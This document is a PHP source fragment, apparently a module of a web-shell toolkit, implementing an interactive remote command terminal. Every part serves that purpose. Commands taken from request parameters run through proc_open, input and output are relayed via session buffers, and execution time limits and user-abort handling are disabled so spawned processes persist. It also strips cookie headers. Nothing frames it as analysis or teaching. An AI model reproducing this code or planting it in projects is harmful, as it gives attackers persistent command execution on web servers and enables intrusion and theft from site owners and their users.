function realCmd_proc_get_status($process){
    if (function_existsEx("proc_get_status")){
        return proc_get_status($process);
    }else{
        $processInfos=array();
        $processInfos["running"]=true;
        return $processInfos;
    }
}
function realCmd_Start($cmd){
    $other_options=array();
    $other_options["bypass_shell"]=true;

    if(substr(__FILE__,0,1)=="/"){
        $envs=array("PATH"=>@getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
    }else{
        $envs=array("PATH"=>@getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
    }
    $envs["TERM"]="xterm";
    $stdOutFile=sys_get_temp_dir().DIRECTORY_SEPARATOR.rand(0,PHP_INT_MAX).".tmp";
    $stdErrOutFile=sys_get_temp_dir().DIRECTORY_SEPARATOR.rand(0,PHP_INT_MAX).".tmp";

    $isWindows=substr(__FILE__,0,1)!="/";

    if(!$isWindows){
        $proc=@proc_open($cmd,
            array(
                array("pipe","r"),
                array("pipe","w"),
                array("pipe","w")
            ),
            $pipes,null,$envs);
    }else{
        $proc=@proc_open($cmd,
            array(
                array("pipe","r"),
                array("file",$stdOutFile,"a"),
                array("file",$stdErrOutFile,"a")
            ),
            $pipes);
    }

    if ($proc!==false){

        @session_start();
        $_SESSION["realCmdAlive"]=true;
        $_SESSION["readBuffer"]="";
        $_SESSION["writeBuffer"]="";
        @session_write_close();

        $stdIn=$pipes[0];
        if (!$isWindows){
            $stdOut=$pipes[1];
            $stdErrOut=$pipes[2];
            if (function_exists("stream_set_blocking")){
                @stream_set_blocking($stdOut,false);
                @stream_set_blocking($stdErrOut,false);
                @stream_set_blocking($stdIn, false);
            }
        }else{
            $stdOut=fopen($stdOutFile,"r+");
            $stdErrOut=fopen($stdErrOutFile,"r+");
        }
    }else{
        global $ERRMSG;
        return "Unable to start process\r\n".$ERRMSG;
    }
    @set_time_limit(0);
    @ignore_user_abort(true);
    @ignore_user_abort(1);
    @ini_set('max_execution_time',0);
    sleep(1);

    $procInfo=null;

    while (($procInfo==null||($procInfo=realCmd_proc_get_status($proc))!==false&&$procInfo["running"]===true)&&$_SESSION["realCmdAlive"]===true){
        @session_start();
        $readBuffer=$_SESSION["readBuffer"];
        $_SESSION["readBuffer"]="";
        $_SESSION["lastReadTime"]=time();
        @session_write_close();


        if (strlen($readBuffer)>0){
            if (fwrite($stdIn,$readBuffer)===false){
                break;
            }
            @fflush($stdIn);
        }else{
            usleep(50000);
        }

        $content=fread($stdErrOut,1024*10);
        if ($content!==false&&strlen($content)>0){
            @session_start();
            $_SESSION["writeBuffer"]=$_SESSION["writeBuffer"].$content;
            @session_write_close();
        }else if ($content===false){
            break;
        }
        if ($isWindows){
            ftruncate($stdErrOut, 0);
        }

        $content=fread($stdOut,1024*10);
        if ($content!==false&&strlen($content)>0){
            @session_start();
            $_SESSION["writeBuffer"]=$_SESSION["writeBuffer"].$content;
            @session_write_close();
        }else if ($content===false){
            break;
        }

        if ($isWindows){
            ftruncate($stdOut, 0);
        }
        $procInfo=realCmd_proc_get_status($proc);
    }
    @session_start();
    $_SESSION["realCmdAlive"]=false;
    @session_write_close();
    if ($proc!==false&&function_existsEx("proc_terminate")){
        @proc_terminate($proc);
    }
    @fclose($stdOut);
    @fclose($stdErrOut);
    @unlink($stdOutFile);
    @unlink($stdErrOutFile);
    @header_remove('set-cookie');
    return "The process is dead";
}
function realCmd_Write($data){
    @session_start();
    if ($_SESSION["realCmdAlive"]===true){
        $_SESSION["readBuffer"]=$_SESSION["readBuffer"].$data;
    }
    @session_write_close();
}
function realCmd_Read(){
    @session_start();
    $content=$_SESSION["writeBuffer"];
    $_SESSION["writeBuffer"]="";
    $alive=$_SESSION["realCmdAlive"];
    $lastReadTime=$_SESSION["lastReadTime"];
    @session_write_close();

    if ((time()-$lastReadTime)>5){
        $_SESSION["realCmdAlive"]=false;
        return $content."The process is dead";
    }
    if ($alive===true){
        return "\x05".$content;
    }else{
        return $content."The process is dead";
    }
}
function realCmd_Stop(){
    @session_start();
    $_SESSION["realCmdAlive"]=false;
    @session_write_close();
    return "ok";
}




if (!function_existsEx("proc_open")){
    return "Unable to call proc_open function";
}
$action=get("action");
$cmdLine=get("cmdLine");
$processWriteData=get("processWriteData");
if ($action!=null){
    if ($action=="start"){
        return realCmd_Start($cmdLine);
    }else if ($action=="processWriteData"){
        realCmd_Write($processWriteData);
        return realCmd_Read();
    }else if ($action=="getResult"){
        return realCmd_Read();
    }else if ($action=="stop"){
        return realCmd_Stop();
    }else{
        return "The action was not found";
    }
}else{
    return "action is null";
}
